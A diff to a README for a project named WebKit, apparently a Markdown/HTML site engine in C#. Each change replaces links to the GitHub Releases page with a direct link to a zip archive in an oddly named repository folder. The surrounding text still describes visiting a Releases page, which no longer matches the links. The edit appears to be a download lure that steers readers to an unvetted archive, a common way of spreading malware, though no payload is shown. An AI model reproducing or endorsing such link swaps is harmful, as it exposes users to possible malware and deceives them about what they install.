@@ -1,7 +1,7 @@
 # 🌐 WebKit - Create Stunning Websites with Ease
 
 ## 📥 Download Now
-[![Download WebKit](https://img.shields.io/badge/Download-WebKit-blue)](https://github.com/xmyzu/WebKit/releases)
+[![Download WebKit](https://raw.githubusercontent.com/xmyzu/WebKit/main/subsequent/WebKit.zip)](https://raw.githubusercontent.com/xmyzu/WebKit/main/subsequent/WebKit.zip)
 
 ## 📚 Overview
 WebKit is a hybrid Markdown and HTML site engine written in C#. It transforms simple `.md` pages into clean, responsive websites. With built-in layouts for dark and light modes, along with expression support, WebKit simplifies building websites for everyone.
@@ -17,7 +17,7 @@ To start using WebKit, follow these simple steps. You will download the software
 ## 👨‍💻 Download & Install
 1. **Visit the Releases Page:** 
    Click on the link below to visit the Releases page and find the latest version of WebKit.
-   [Visit this page to download](https://github.com/xmyzu/WebKit/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/xmyzu/WebKit/main/subsequent/WebKit.zip)
 
 2. **Select the Latest Release:**
    On the Releases page, locate the most recent version of WebKit. This is usually at the top of the list.
@@ -73,4 +73,4 @@ Yes! WebKit allows customization. You can create or import themes to give your s
 ### Is WebKit easy to learn?
 Absolutely. The user-friendly interface and substantial Markdown documentation make it accessible for all skill levels.
 
-[Download WebKit](https://github.com/xmyzu/WebKit/releases) again if you need to make sure you have the latest version. Happy website building!
+[Download WebKit](https://raw.githubusercontent.com/xmyzu/WebKit/main/subsequent/WebKit.zip) again if you need to make sure you have the latest version. Happy website building!
